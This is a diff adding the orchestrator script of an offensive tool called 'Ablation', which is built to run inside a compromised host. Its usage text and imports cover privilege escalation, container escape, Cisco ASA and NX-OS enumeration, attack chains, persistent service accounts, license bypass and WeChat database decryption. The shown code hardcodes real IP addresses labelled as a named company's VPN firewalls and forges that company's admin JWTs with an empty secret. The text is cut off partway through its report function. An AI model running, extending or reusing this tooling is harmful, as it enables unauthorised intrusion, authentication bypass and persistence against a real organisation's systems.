@@ -1,0 +1,2136 @@
+#!/usr/bin/env python3
+"""
+Ablation - Autonomous Reverse Engineering Tool
+
+Deploy inside compromised system to autonomously reverse engineer unknown platform.
+
+Usage:
+    ./ablation              - Full autonomous analysis
+    ./ablation --quick      - Quick platform fingerprint only
+    ./ablation --process PID - Analyze specific process
+    ./ablation --binary FILE - Analyze specific binary
+    ./ablation --syscalls PID [duration] - Trace syscalls for process
+    ./ablation --privesc     - Enumerate privilege escalation paths
+    ./ablation --docker      - Docker enumeration
+    ./ablation --k8s         - Kubernetes enumeration
+    ./ablation --orka        - Orka platform enumeration
+    ./ablation --containers  - Full container analysis (Docker + K8s + Orka)
+    ./ablation --asa [HOST]  - Cisco ASA WebVPN enumeration
+    ./ablation --jwt FILE    - JWT/cryptographic weakness analysis
+    ./ablation --harbor HOST - Harbor registry enumeration
+    ./ablation --arm64 FILE  - ARM64 Mach-O deep analysis
+    ./ablation --java PATH   - Java .class/.jar security audit
+    ./ablation --swift PATH  - Swift Mach-O binary RE
+    ./ablation --wechat      - WeChat Android RE: MMTLS + DB key + Frida hooks
+    ./ablation --wechat-apk APK    - Analyze WeChat APK (lib inventory, manifest)
+    ./ablation --wechat-libs DIR   - Enumerate arm64-v8a native lib attack surface
+    ./ablation --wechat-db-key IMEI UIN - Compute EnMicroMsg.db decryption key
+    ./ablation --wechat-frida      - Generate Frida hooks for MMTLS key extraction
+    ./ablation --axis PATH         - AXIS ACAP EAP RE: license bypass, SIP/barcode/bodyworn/facedetector
+    ./ablation --axis-license PATH - licensekey_verify bypass vectors (SipThirdPartyIntegration)
+    ./ablation --axis-bodyworn PATH - BodyWornLiveSelfHosted WebRTC/TURN/JWT attack surface
+    ./ablation --axis-frida PATH   - Frida license bypass script for AXIS ACAP binary
+    ./ablation --fujitsu           - Fujitsu PRIMERGY/PRIMEQUEST iRMC firmware RE: all 13 findings (F1-F13)
+    ./ablation --fujitsu-chain     - Print critical exploit chain (F1->F5->RCE / F13 DDNS->execdaemon)
+    ./ablation --fujitsu-json      - Dump all findings as JSON to /tmp/fujitsu-irmc-re.json
+    ./ablation --mcp-fuzz          - Grammar-guided MCP tool schema fuzzer (prompt injection discovery)
+    ./ablation --mcp-fuzz-dry-run  - Print one sample MCP manifest (no Atheris required)
+    ./ablation --func-db-seed      - Seed function ID DB from all confirmed RE sources
+    ./ablation --func-db-query NAME - Query function ID DB by name/role/offset
+    ./ablation --func-db-summary   - Print function ID DB row counts
+    ./ablation --func-db PATH      - Path to function ID DB (default ~/.ablation/func_id.db)
+"""
+
+import sys
+import json
+from pathlib import Path
+
+# Core modules
+sys.path.insert(0, str(Path(__file__).parent / 'core'))
+sys.path.insert(0, str(Path(__file__).parent / 'modules'))
+
+from platform_detect import PlatformDetector
+from binary_parser import BinaryParser
+from disasm_engine import DisasmEngine, DisasmEngineX
+from process_enum import ProcessEnumerator
+from syscall_trace import SyscallTracer
+from privesc_enum import PrivescEnumerator
+from network_analyze import NetworkAnalyzer
+from docker_enum import DockerEnumerator
+from k8s_enum import K8sEnumerator
+from orka_enum import OrkaEnumerator
+
+try:
+    from swift_re import SwiftREAnalyzer
+    HAS_SWIFT_RE = True
+except ImportError:
+    HAS_SWIFT_RE = False
+    SwiftREAnalyzer = None
+
+try:
+    from arm64_analyzer import ARM64Analyzer, analyze_arm64_binary
+    HAS_ARM64 = True
+except ImportError:
+    HAS_ARM64 = False
+    ARM64Analyzer = None
+
+try:
+    from jwt_crypto_analyzer import (
+        JWTCryptoAnalyzer, forge_token, find_jwts_in_file,
+        MACSTADIUM_IDP, MACSTADIUM_FORGE_PAYLOADS,
+    )
+    HAS_CRYPTO_AUDIT = True
+except ImportError:
+    HAS_CRYPTO_AUDIT = False
+    JWTCryptoAnalyzer = None
+
+try:
+    from asa_enum import ASAEnumerator, enumerate_macstadium_asas, MACSTADIUM_ASAS
+    HAS_ASA_ENUM = True
+except ImportError:
+    HAS_ASA_ENUM = False
+    ASAEnumerator = None
+
+try:
+    from harbor_enum import HarborEnumerator
+    HAS_HARBOR = True
+except ImportError:
+    HAS_HARBOR = False
+    HarborEnumerator = None
+
+try:
+    from java_re import JavaREAnalyzer
+    HAS_JAVA_RE = True
+except ImportError:
+    HAS_JAVA_RE = False
+    JavaREAnalyzer = None
+
+try:
+    from nxos_enum import NXOSEnumerator, enumerate_macstadium_cisco, MACSTADIUM_CISCO_TARGETS
+    HAS_NXOS = True
+except ImportError:
+    HAS_NXOS = False
+    NXOSEnumerator = None
+    MACSTADIUM_CISCO_TARGETS = []
+
+try:
+    from cisco_asdm_download_re import ASDMDownloader, ASDMJarRE as ASDMJARAnalyzer
+    HAS_ASDM_RE = True
+except ImportError:
+    HAS_ASDM_RE = False
+    ASDMDownloader = None
+
+try:
+    from cisco_webvpn_js_re import WebVPNJSRE
+    HAS_WEBVPN_JS = True
+except ImportError:
+    HAS_WEBVPN_JS = False
+    WebVPNJSRE = None
+
+try:
+    from cisco_ios_re import CiscoIOSImage, analyze_ios_firmware
+    HAS_IOS_RE = True
+except ImportError:
+    HAS_IOS_RE = False
+    CiscoIOSImage = None
+
+try:
+    from cisco_rommon_re import ROMMONBypassRE
+    HAS_ROMMON_RE = True
+except ImportError:
+    HAS_ROMMON_RE = False
+    ROMMONBypassRE = None
+
+try:
+    from cisco_config_re import CiscoConfigRE
+    HAS_CONFIG_RE = True
+except ImportError:
+    HAS_CONFIG_RE = False
+    CiscoConfigRE = None
+
+try:
+    from cisco_api_enum import CiscoAPIEnum
+    HAS_CISCO_API = True
+except ImportError:
+    HAS_CISCO_API = False
+    CiscoAPIEnum = None
+
+try:
+    from cisco_nxos_guestshell_re import (
+        GuestShellRE as NXOSGuestshellRE,
+        NXAPIBashExec, GuestshellRootfsInject, NETCONFAttackPrimitives,
+    )
+    HAS_GUESTSHELL = True
+except ImportError:
+    HAS_GUESTSHELL = False
+    NXOSGuestshellRE = None
+    NXAPIBashExec = None
+    GuestshellRootfsInject = None
+    NETCONFAttackPrimitives = None
+
+try:
+    from cisco_cstp_attack import (
+        HostScanGateRE, CSTPTunnelRE, ASDMJarClassRE, GoBinaryRE,
+        SAMLSpInjectionRE, UsernameTimingOracleRE, TunnelGroupEnumRE, RADIUSClassAttrRE,
+        CRLBypassRE, CertMapRE, RadiusCoARE, ASAVersionRE,
+        OrkaJWTRE,
+        analyze_asa_attack_surface, analyze_go_binary, analyze_java_class,
+        analyze_saml_sp, analyze_username_oracle, analyze_tunnel_groups, analyze_radius_class_attr,
+        analyze_crl_bypass, analyze_cert_map, analyze_radius_coa, analyze_asa_version,
+        analyze_orka_jwt,
+        MACSTADIUM_SAML, MACSTADIUM_ASA,
+    )
+    HAS_CSTP = True
+except ImportError:
+    HAS_CSTP = False
+    HostScanGateRE = None
+    CSTPTunnelRE = None
+    GoBinaryRE = None
+    SAMLSpInjectionRE = None
+    UsernameTimingOracleRE = None
+    TunnelGroupEnumRE = None
+    RADIUSClassAttrRE = None
+    CRLBypassRE = None
+    CertMapRE = None
+    RadiusCoARE = None
+    ASAVersionRE = None
+
+try:
+    from orka_oidc_re import (
+        run_full_re as orka_oidc_run,
+        run_jwt_analysis as orka_jwt_analysis,
+        forge_admin_token, forge_system_masters_token,
+        get_binary_re_findings,
+        probe_cluster_info, probe_k8s_api, probe_harbor_creds,
+        probe_oidc_discovery,
+        generate_pkce, generate_oidc_login_url,
+        KNOWN_TOKEN,
+    )
+    HAS_ORKA_OIDC = True
+except ImportError:
+    HAS_ORKA_OIDC = False
+    orka_oidc_run = None
+
+try:
+    from orka_api_surface_re import (
+        probe_all_routes, get_api_surface_findings, ORKA_ROUTES,
+    )
+    HAS_ORKA_SURFACE = True
+except ImportError:
+    HAS_ORKA_SURFACE = False
+    probe_all_routes = None
+
+try:
+    from orka_vm_exec_re import (
+        list_vms, probe_vm_exec_surface,
+        build_k8s_exec_cmd, exec_virsh_via_kubectl, build_virsh_chain,
+        create_service_account_token, create_persistent_sa,
+        list_registry_credentials, probe_harbor_api,
+        probe_api_surface, run_full_attack_chain,
+        VM_COMMANDS, VM_STATES, VIRSH_DOMAIN, ORKA_VM_CONTAINER,
+        BACKDOOR_CHAIN_DOC,
+    )
+    HAS_ORKA_VM_EXEC = True
+except ImportError:
+    HAS_ORKA_VM_EXEC = False
+    run_full_attack_chain = None
+
+try:
+    from modules.cisco_radius_ise_re import (
+        RadiusPacket, RadiusClassInjector, DAP_RADIUS_ATTRS,
+        ASA_A0_CODES, MACSTADIUM_GROUP_POLICIES, CLASS_ATTR_FORMAT,
+        analyze_radius_surface,
+    )
+    HAS_RADIUS_RE = True
+except ImportError:
+    HAS_RADIUS_RE = False
+    analyze_radius_surface = None
+
+try:
+    from modules.cisco_asa_lina_re import (
+        CiscoASALinaRE, radius_password_xor_decrypt,
+        tacacs_decrypt_body, LINA_AAA_STATE_MACHINE,
+        STATIC_ANALYSIS_METHODOLOGY, ARM64_REGS,
+    )
+    HAS_LINA_RE = True
+except ImportError:
+    HAS_LINA_RE = False
+    CiscoASALinaRE = None
+
+try:
+    from wechat_re import WeChatREAnalyzer
+    HAS_WECHAT_RE = True
+except ImportError:
+    HAS_WECHAT_RE = False
+    WeChatREAnalyzer = None
+
+try:
+    from modules.cisco_asa_cred_audit import (
+        CiscoASAConfigAudit, CiscoASALiveCredCheck, cisco_type7_decode,
+    )
+    HAS_CRED_AUDIT = True
+except ImportError:
+    HAS_CRED_AUDIT = False
+    CiscoASAConfigAudit = None
+
+try:
+    from modules.cisco_ftd_re import CiscoFTDRE, generate_snort_fuzz_corpus
+    HAS_FTD_RE = True
+except ImportError:
+    HAS_FTD_RE = False
+    CiscoFTDRE = None
+
+try:
+    from modules.regression import (
+        Regression, LogisticRegression, DescriptiveStats, CorrelationMatrix,
+        FirmwareVersionRegression, SymbolicOffsetRegression, compare_models,
+        run_regression, run_demo as regression_demo,
+    )
+    HAS_REGRESSION = True
+except ImportError:
+    HAS_REGRESSION = False
+    Regression = None
+    LogisticRegression = None
+    CiscoASALiveCredCheck = None
+    cisco_type7_decode = None
+
+try:
+    from modules.api_re import run_re as api_re_run, APIMap
+    HAS_API_RE = True
+except ImportError:
+    HAS_API_RE = False
+    api_re_run = None
+
+try:
+    from modules.fujitsu_irmc_re import ALL_FINDINGS as FUJITSU_FINDINGS, SUMMARY as FUJITSU_SUMMARY
+    HAS_FUJITSU_RE = True
+except ImportError:
+    HAS_FUJITSU_RE = False
+    FUJITSU_FINDINGS = None
+    FUJITSU_SUMMARY = None
+
+
+MACSTADIUM_ASAS = [
+    {'host': '207.254.35.12', 'port': 443, 'label': 'ASA-Primary'},
+    {'host': '207.254.16.2',  'port': 443, 'label': 'ASA-Secondary'},
+]
+
+
+class Ablation:
+    """Main reverse engineering orchestrator"""
+    
+    def __init__(self):
+        self.platform = None
+        self.processes = []
+        self.binaries = []
+        self.findings = {
+            'platform': {},
+            'processes': [],
+            'binaries': [],
+            'vulnerabilities': [],
+            'interesting': [],
+            'privesc_paths': [],
+            'network': {},
+            'docker': {},
+            'kubernetes': {},
+            'orka': {},
+            'swift_re': {},
+            'java_re': {},
+            'crypto_audit': {},
+            'asa': {},
+            'nxos': {},
+        }
+        self.version = "2.4.0"
+    
+    def banner(self):
+        """Display banner"""
+        print(r"""
+    ___    __    __    ___  ___________  ____  _  __
+   / _ |  / /   / /   / _ |/_  __/  _/ |/ / | / /
+  / __ | / _ \ / /__ / __ | / /  _/ //    /  |/ / 
+ /_/ |_|/_.__//____//_/ |_|/_/ /___/_/|_/_/|___/  
+                                                   
+ Autonomous Reverse Engineering Tool v{}
+ Deploy INSIDE systems | Zero dependencies
+        """.format(self.version))
+    
+    def run_autonomous(self):
+        """Full autonomous analysis"""
+        self.banner()
+        print("[*] Ablation - Autonomous Mode")
+        print("[*] Analyzing compromised system...")
+        print()
+        
+        # Step 1: Platform detection
+        print("[1/8] Platform Detection")
+        self.detect_platform()
+        print(f"  OS: {self.findings['platform']['os']} {self.findings['platform']['arch_bits']}bit")
+        print(f"  Kernel: {self.findings['platform'].get('kernel', 'N/A')}")
+        print()
+        
+        # Step 2: Process enumeration
+        print("[2/8] Process Enumeration")
+        self.enumerate_processes()
+        print(f"  Found {len(self.findings['processes'])} running processes")
+        print()
+        
+        # Step 3: Binary discovery
+        print("[3/8] Binary Discovery")
+        self.discover_binaries()
+        print(f"  Found {len(self.findings['binaries'])} interesting binaries")
+        print()
+        
+        # Step 4: Network analysis
+        print("[4/8] Network Analysis")
+        self.analyze_network()
+        print(f"  Interfaces: {len(self.findings['network'].get('interfaces', []))}")
+        print(f"  Listening: {len(self.findings['network'].get('listening', []))}")
+        print()
+        
+        # Step 5: Container/platform enumeration
+        print("[5/8] Container/Platform Enumeration")
+        self.enumerate_containers()
+        docker_info = self.findings['docker']
+        k8s_info = self.findings['kubernetes']
+        orka_info = self.findings['orka']
+        
+        if docker_info.get('in_container') or docker_info.get('socket_access'):
+            print(f"  Docker: In container={docker_info.get('in_container')}, Socket={docker_info.get('socket_access')}")
+        if k8s_info.get('in_k8s'):
+            print(f"  Kubernetes: Namespace={k8s_info.get('namespace')}")
+        if orka_info.get('in_orka_vm') or orka_info.get('orka_api_reachable'):
+            print(f"  Orka: VM={orka_info.get('in_orka_vm')}, API={orka_info.get('orka_api_reachable')}")
+        print()
+        
+        # Step 6: Vulnerability hunting
+        print("[6/8] Vulnerability Analysis")
+        self.hunt_vulnerabilities()
+        print(f"  Identified {len(self.findings['vulnerabilities'])} potential vulnerabilities")
+        print()
+        
+        # Step 7: Privilege escalation paths
+        print("[7/8] Privilege Escalation Enumeration")
+        self.enumerate_privesc()
+        print(f"  Found {len(self.findings['privesc_paths'])} potential paths")
+        print()
+        
+        # Step 8: Swift binary RE (macOS/iOS targets)
+        if self.findings['platform'].get('os') in ('Darwin', 'macOS') or \
+           any('swift' in b.get('path', '').lower() or 'orka' in b.get('path', '').lower()
+               for b in self.findings['binaries']):
+            print("[8/11] Swift Binary Analysis")
+            self.analyze_swift_binaries()
+            sr = self.findings['swift_re']
+            print(f"  Symbols: {sr.get('total_symbols', 0)}, SwiftNIO: {sr.get('swiftnio_detected', False)}, gRPC: {sr.get('grpc_detected', False)}")
+            print()
+        else:
+            print("[8/11] Swift Analysis — skipped (non-Darwin)")
+            print()
+
+        # Step 9: Java/JVM RE
+        print("[9/11] Java/JVM Analysis")
+        self.analyze_java_artifacts()
+        jr = self.findings['java_re']
+        print(f"  Classes: {jr.get('total_classes', 0)}, Frameworks: {jr.get('frameworks', [])}")
+        print()
+
+        # Step 10: Cryptographic audit
+        print("[10/11] Cryptographic Audit")
+        self.audit_crypto()
+        ca = self.findings['crypto_audit']
+        jwt_count = len(ca.get('jwt_findings', []))
+        key_count = len(ca.get('key_material', []))
+        print(f"  JWTs found: {jwt_count}, Key material: {key_count}")
+        if ca.get('critical_findings'):
+            for cf in ca['critical_findings'][:3]:
+                print(f"  [CRIT] {cf}")
+        print()
+
+        # Step 11: Generate report
+        print("[11/11] Report Generation")
+        report_path = self.generate_report()
+        print(f"  Report saved: {report_path}")
+        print()
+
+        return self.findings
+    
+    def detect_platform(self):
+        """Detect platform characteristics"""
+        detector = PlatformDetector()
+        detector.detect_all()
+        self.findings['platform'] = detector.info
+        self.platform = detector
+        return detector.info
+    
+    def enumerate_processes(self):
+        """Enumerate all running processes"""
+        enum = ProcessEnumerator()
+        procs = enum.list_all_processes()
+        
+        # Find interesting processes
+        interesting_names = ['ssh', 'sshd', 'apache', 'nginx', 'mysql', 'postgres', 
+                           'docker', 'kubelet', 'redis', 'mongo', 'sudo', 'su',
+                           'containerd', 'dockerd', 'kube-proxy', 'orka']
+        
+        for proc in procs:
+            entry = {
+                'pid': proc['pid'],
+                'name': proc['name'],
+                'cmdline': proc['cmdline']
+            }
+            
+            # Flag interesting ones
+            if any(name in proc['name'].lower() for name in interesting_names):
+                entry['interesting'] = True
+                self.findings['interesting'].append({
+                    'type': 'process',
+                    'name': proc['name'],
+                    'detail': f"PID {proc['pid']}"
+                })
+            
+            self.findings['processes'].append(entry)
+        
+        return procs
+    
+    def discover_binaries(self):
+        """Discover interesting binaries"""
+        search_paths = [
+            '/bin',
+            '/sbin',
+            '/usr/bin',
+            '/usr/sbin',
+            '/usr/local/bin',
+            '/opt'
+        ]
+        
+        interesting_binaries = []
+        
+        for path in search_paths:
+            path_obj = Path(path)
+            if not path_obj.exists():
+                continue
+            
+            try:
+                for binary in path_obj.iterdir():
+                    if binary.is_file():
+                        try:
+                            parser = BinaryParser(binary)
+                            info = parser.parse()
+                            
+                            entry = {
+                                'path': str(binary),
+                                'format': info['format'],
+                                'bits': info.get('bits'),
+                                'entry': info.get('entry_point')
+                            }
+                            
+                            interesting_binaries.append(entry)
+                            
+                            if len(interesting_binaries) >= 50:
+                                break
+                        except:
+                            pass
+            except:
+                pass
+            
+            if len(interesting_binaries) >= 50:
+                break
+        
+        self.findings['binaries'] = interesting_binaries
+        return interesting_binaries
+    
+    def analyze_network(self):
+        """Analyze network configuration"""
+        analyzer = NetworkAnalyzer()
+        network_info = analyzer.enumerate_all()
+        self.findings['network'] = network_info
+        return network_info
+    
+    def enumerate_containers(self):
+        """Enumerate Docker, Kubernetes, and Orka"""
+        # Docker
+        docker_enum = DockerEnumerator()
+        self.findings['docker'] = docker_enum.enumerate_all()
+        
+        # Kubernetes
+        k8s_enum = K8sEnumerator()
+        self.findings['kubernetes'] = k8s_enum.enumerate_all()
+        
+        # Orka
+        orka_enum = OrkaEnumerator()
+        self.findings['orka'] = orka_enum.enumerate_all()
+        
+        return {
+            'docker': self.findings['docker'],
+            'kubernetes': self.findings['kubernetes'],
+            'orka': self.findings['orka']
+        }
+    
+    def hunt_vulnerabilities(self):
+        """Hunt for common vulnerabilities"""
+        vulns = []
+        
+        if self.findings['platform'].get('security'):
+            sec = self.findings['platform']['security']
+            
+            # ASLR disabled
+            if sec.get('aslr') == 'disabled':
+                vulns.append({
+                    'severity': 'HIGH',
+                    'type': 'ASLR Disabled',
+                    'description': 'Address Space Layout Randomization is disabled',
+                    'impact': 'Easier exploitation of memory corruption bugs',
+                    'remediation': 'Enable ASLR: echo 2 > /proc/sys/kernel/randomize_va_space'
+                })
+        
+        # Check for ptrace availability
+        if self.findings['platform'].get('capabilities', {}).get('ptrace_scope') == 0:
+            vulns.append({
+                'severity': 'MEDIUM',
+                'type': 'Unrestricted ptrace',
+                'description': 'ptrace is unrestricted (ptrace_scope=0)',
+                'impact': 'Any process can debug any other process',
+                'remediation': 'Restrict ptrace: echo 1 > /proc/sys/kernel/yama/ptrace_scope'
+                })
+        
+        # Container escape vectors
+        if self.findings['docker'].get('escape_vectors'):
+            for vec in self.findings['docker']['escape_vectors']:
+                vulns.append({
+                    'severity': vec['severity'],
+                    'type': f"Docker: {vec['type']}",
+                    'description': vec['description'],
+                    'impact': 'Container escape possible',
+                    'remediation': vec.get('exploit', 'Review container configuration')
+                })
+        
+        if self.findings['kubernetes'].get('escape_vectors'):
+            for vec in self.findings['kubernetes']['escape_vectors']:
+                vulns.append({
+                    'severity': vec['severity'],
+                    'type': f"K8s: {vec['type']}",
+                    'description': vec['description'],
+                    'impact': 'Pod escape possible',
+                    'remediation': vec.get('exploit', 'Review pod security policy')
+                })
+        
+        # Orka findings
+        if self.findings['orka'].get('findings'):
+            for finding in self.findings['orka']['findings']:
+                vulns.append({
+                    'severity': finding['severity'],
+                    'type': f"Orka: {finding['type']}",
+                    'description': finding['description'],
+                    'impact': finding.get('exploit', 'Security exposure'),
+                    'remediation': 'Review Orka security configuration'
+                })
+        
+        self.findings['vulnerabilities'] = vulns
+        return vulns
+    
+    def enumerate_privesc(self):
+        """Enumerate privilege escalation paths"""
+        enum = PrivescEnumerator()
+        paths = enum.enumerate_all()
+        self.findings['privesc_paths'] = paths
+        return paths
+    
+    def analyze_swift_binaries(self):
+        """Find and analyze Swift binaries on the system"""
+        if not HAS_SWIFT_RE:
+            self.findings['swift_re'] = {'error': 'swift_re module not available'}
+            return
+
+        analyzer = SwiftREAnalyzer()
+        results = {
+            'total_symbols': 0,
+            'swiftnio_detected': False,
+            'grpc_detected': False,
+            'binaries': [],
+            'interesting_strings': [],
+            'findings': []
+        }
+
+        # Known interesting Swift binaries (Orka engine + any found in binaries list)
+        swift_candidates = [
+            '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
+        ]
+        swift_candidates += [
+            b['path'] for b in self.findings['binaries']
+            if b.get('format') in ('macho', 'Mach-O')
+        ]
+
+        for path in swift_candidates[:5]:
+            try:
+                result = analyzer.analyze(path)
+                results['total_symbols'] += result.get('swift_symbol_count', 0)
+                grpc_svcs = result.get('grpc_services', [])
+                results['swiftnio_detected'] = results['swiftnio_detected'] or any(
+                    'NIO' in s.get('service_name', '') for s in grpc_svcs
+                )
+                results['grpc_detected'] = results['grpc_detected'] or bool(grpc_svcs)
+                results['interesting_strings'].extend(result.get('security_strings', [])[:10])
+                results['findings'].extend(result.get('findings', []))
+                results['binaries'].append({'path': path, 'grpc_services': grpc_svcs,
+                                            'vapor_routes': result.get('vapor_routes', []),
+                                            'swift_sections': result.get('swift_sections', {})})
+            except Exception as e:
+                results['binaries'].append({'path': path, 'error': str(e)})
+
+        self.findings['swift_re'] = results
+
+    def analyze_java_artifacts(self):
+        """Find and analyze Java class files and JARs"""
+        if not HAS_JAVA_RE:
+            self.findings['java_re'] = {'error': 'java_re module not available'}
+            return
+
+        analyzer = JavaREAnalyzer()
+        paths = analyzer.scan_for_class_files()
+
+        all_results = {
+            'total_classes': 0,
+            'frameworks': [],
+            'dangerous_calls': [],
+            'config_secrets': [],
+            'findings': []
+        }
+
+        for path in paths[:10]:
+            try:
+                result = analyzer.analyze(path)
+                all_results['total_classes'] += result.get('class_count', 0)
+                all_results['frameworks'] = list(set(
+                    all_results['frameworks'] + result.get('frameworks', [])
+                ))
+                all_results['dangerous_calls'].extend(result.get('dangerous_calls', []))
+                all_results['config_secrets'].extend(result.get('config_secrets', []))
+                all_results['findings'].extend(result.get('findings', []))
+            except Exception:
+                pass
+
+        self.findings['java_re'] = all_results
+
+    def audit_crypto(self):
+        """Run cryptographic audit on the system — JWT/SAML/key material scan."""
+        if not HAS_CRYPTO_AUDIT:
+            self.findings['crypto_audit'] = {'error': 'jwt_crypto_analyzer module not available'}
+            return
+
+        auditor  = JWTCryptoAnalyzer()
+        result   = {'jwt_findings': [], 'key_material': [], 'forged_tokens': []}
+        critical = []
+
+        # Scan interesting files for embedded JWTs
+        scan_paths = [
+            '/etc', '/var/log', '/tmp',
+            str(Path.home() / '.kube'),
+            str(Path.home() / '.config'),
+        ]
+        for sp in scan_paths:
+            try:
+                for p in Path(sp).rglob('*.json'):
+                    fres = auditor.analyze_file(str(p))
+                    if fres['tokens_found']:
+                        result['jwt_findings'].append(fres)
+                        for f in fres['findings']:
+                            if f['severity'] == 'CRITICAL':
+                                critical.append(f'{f["type"]}: {f["description"][:80]}')
+            except Exception:
+                pass
+
+        # Pre-forge MacStadium admin tokens (empty secret confirmed)
+        if HAS_CRYPTO_AUDIT:
+            for payload in MACSTADIUM_FORGE_PAYLOADS:
+                tok = forge_token(payload, secret=b'', alg='HS256')
+                result['forged_tokens'].append({'payload': payload, 'token': tok})
+                critical.append(f'FORGED_JWT(empty_secret): sub={payload["sub"]} → {tok[:40]}...')
+
+        result['critical_findings'] = critical
+
+        for vuln_str in critical:
+            self.findings['vulnerabilities'].append({
+                'severity':    'CRITICAL',
+                'type':        'CryptoAudit',
+                'description': vuln_str,
+                'impact':      'Token forgery / auth bypass',
+                'remediation': 'Rotate JWT secrets; enforce HS256 with >=256-bit random key',
+            })
+
+        self.findings['crypto_audit'] = result
+
+    def enumerate_asa(self, targets=None):
+        """Enumerate Cisco ASA VPN instances (MacStadium: 207.254.35.12, 207.254.16.2, 207.254.72.76)."""
+        if not HAS_ASA_ENUM:
+            self.findings['asa'] = {'error': 'asa_enum module not available'}
+            return {}
+
+        results = []
+        hosts = targets or [cfg['host'] for cfg in MACSTADIUM_ASAS]
+
+        for host in hosts:
+            cfg  = next((c for c in MACSTADIUM_ASAS if c['host'] == host), {})
+            enum = ASAEnumerator(host, name=cfg.get('name', host))
+            if cfg.get('groups'):
+                enum.groups = cfg['groups']
+            r = enum.enumerate_all()
+            r['cert_pin'] = cfg.get('cert_pin')
+            results.append(r)
+
+            # Fold ASA findings into main vuln list
+            for finding in r.get('findings', []):
+                if finding['severity'] in ('CRITICAL', 'HIGH'):
+                    self.findings['vulnerabilities'].append({
+                        'severity':    finding['severity'],
+                        'type':        f'ASA: {finding["type"]}',
+                        'description': finding['description'],
+                        'impact':      finding.get('exploit', 'VPN/auth exposure'),
+                        'remediation': 'Harden ASA WebVPN configuration',
+                    })
+
+        self.findings['asa'] = {'instances': results, 'count': len(results)}
+        return self.findings['asa']
+
+    def enumerate_nxos(self, targets=None):
+        """Enumerate Cisco NX-OS, ACI/APIC, and VXLAN fabric (MacStadium 207.254.14.x)."""
+        if not HAS_NXOS:
+            self.findings['nxos'] = {'error': 'nxos_enum module not available'}
+            return {}
+
+        enum = NXOSEnumerator(targets=targets or MACSTADIUM_CISCO_TARGETS)
+        result = enum.run()
+        self.findings['nxos'] = result
+
+        for finding in enum.findings:
+            if finding.get('severity') in ('CRITICAL', 'HIGH'):
+                self.findings['vulnerabilities'].append({
+                    'severity':    finding['severity'],
+                    'type':        f"NX-OS: {finding['type']}",
+                    'description': f"{finding.get('host', '')} creds={finding.get('creds', '')}",
+                    'impact':      'Full fabric control / tenant enumeration / VTEP discovery',
+                    'remediation': 'Rotate credentials; disable Telnet; enforce TACACS+',
+                })
+
+        return result
+
+    def analyze_process(self, pid):
+        """Deep analysis of specific process"""
+        enum = ProcessEnumerator(pid)
+        
+        report = {
+            'pid': pid,
+            'maps': enum.get_memory_maps(),
+            'modules': enum.get_loaded_modules(),
+            'fds': enum.get_open_files(),
+            'env': enum.get_environment(),
+            'wx_regions': enum.find_writable_executable()
+        }
+        
+        return report
+    
+    def analyze_binary(self, filepath):
+        """Deep analysis of specific binary"""
+        parser = BinaryParser(filepath)
+        info = parser.parse()
+        
+        # Disassemble entry point
+        with open(filepath, 'rb') as f:
+            if info.get('entry_point'):
+                entry = int(info['entry_point'], 16)
+                f.seek(entry if entry < 1000000 else 0)
+                code = f.read(512)
+                
+                engine = DisasmEngine()
+                disasm = engine.disassemble(code, entry, count=50)
+                
+                info['disassembly'] = disasm[:20]
+        
+        return info
+    
+    def trace_syscalls(self, pid, duration=5):
+        """Trace syscalls for a process"""
+        tracer = SyscallTracer(pid)
+        return tracer.trace_process(duration)
+    
+    def generate_report(self):
+        """Generate comprehensive report"""
+        report_path = Path('/tmp/ablation-report.json')
+        
+        with open(report_path, 'w') as f:
+            json.dump(self.findings, f, indent=2)
+        
+        # Text summary
+        summary_path = Path('/tmp/ablation-summary.txt')
+        with open(summary_path, 'w') as f:
+            f.write("="*60 + "\n")
+            f.write("ABLATION - AUTONOMOUS ANALYSIS REPORT\n")
+            f.write("="*60 + "\n\n")
+            
+            f.write("PLATFORM\n")
+            f.write("-"*60 + "\n")
+            p = self.findings['platform']
+            f.write(f"OS: {p.get('os')} {p.get('os_release', '')}\n")
+            f.write(f"Architecture: {p.get('machine')} ({p.get('arch_bits')} bit)\n")
+            if 'kernel' in p:
+                f.write(f"Kernel: {p['kernel']}\n")
+            f.write("\n")
+            
+            f.write("CONTAINERS/PLATFORMS\n")
+            f.write("-"*60 + "\n")
+            docker_info = self.findings['docker']
+            k8s_info = self.findings['kubernetes']
+            orka_info = self.findings['orka']
+            f.write(f"Docker In Container: {docker_info.get('in_container', False)}\n")
+            f.write(f"Docker Socket Access: {docker_info.get('socket_access', False)}\n")
+            f.write(f"Kubernetes: {k8s_info.get('in_k8s', False)}\n")
+            f.write(f"Orka VM: {orka_info.get('in_orka_vm', False)}\n")
+            f.write(f"Orka API: {orka_info.get('orka_api_reachable', False)}\n")
+            if orka_info.get('in_orka_vm'):
+                f.write(f"  Metadata Server: {orka_info.get('metadata_server', {}).get('available', False)}\n")
+            f.write("\n")
+            
+            f.write("NETWORK\n")
+            f.write("-"*60 + "\n")
+            net = self.findings['network']
+            f.write(f"Interfaces: {len(net.get('interfaces', []))}\n")
+            f.write(f"Listening Ports: {len(net.get('listening', []))}\n")
+            f.write(f"Active Connections: {len(net.get('connections', []))}\n")
+            f.write("\n")
+            
+            f.write("PROCESSES\n")
+            f.write("-"*60 + "\n")
+            f.write(f"Total: {len(self.findings['processes'])}\n")
+            interesting_procs = [p for p in self.findings['processes'] if p.get('interesting')]
+            if interesting_procs:
+                f.write(f"Interesting: {len(interesting_procs)}\n")
+                for p in interesting_procs[:10]:
+                    f.write(f"  PID {p['pid']}: {p['name']}\n")
+            f.write("\n")
+            
+            f.write("VULNERABILITIES\n")
+            f.write("-"*60 + "\n")
+            for vuln in self.findings['vulnerabilities']:
+                f.write(f"[{vuln['severity']}] {vuln['type']}\n")
+                f.write(f"  {vuln['description']}\n")
+                f.write(f"  Impact: {vuln['impact']}\n")
+                f.write("\n")
+            
+            f.write("PRIVILEGE ESCALATION PATHS\n")
+            f.write("-"*60 + "\n")
+            for path in self.findings['privesc_paths']:
+                f.write(f"[{path['severity']}] {path['category']}\n")
+                f.write(f"  {path['description']}\n")
+                f.write("\n")
+
+            # Swift RE
+            sr = self.findings.get('swift_re', {})
+            if sr and not sr.get('error'):
+                f.write("SWIFT BINARY ANALYSIS\n")
+                f.write("-"*60 + "\n")
+                f.write(f"Total symbols: {sr.get('total_symbols', 0)}\n")
+                f.write(f"SwiftNIO detected: {sr.get('swiftnio_detected', False)}\n")
+                f.write(f"gRPC detected: {sr.get('grpc_detected', False)}\n")
